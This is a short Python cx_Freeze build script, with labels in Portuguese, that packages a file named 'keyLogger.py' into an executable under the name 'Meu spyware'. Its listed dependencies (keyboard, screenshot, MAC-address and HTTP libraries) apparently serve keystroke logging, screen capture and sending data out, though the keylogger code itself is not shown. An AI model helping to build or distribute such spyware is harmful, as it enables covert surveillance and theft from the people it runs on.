from cx_Freeze import setup, Executable

build_exe_options = {"packages": ["os"], "includes": ["keyboard", "psutil", "requests", "pyscreenshot", "getmac", "PIL"]}

base = None

setup(
    name="Meu spyware",
    version="0.1",
    description="Um spyware",
    options={"build_exe": build_exe_options},
    executables=[Executable("keyLogger.py", base=base)]
)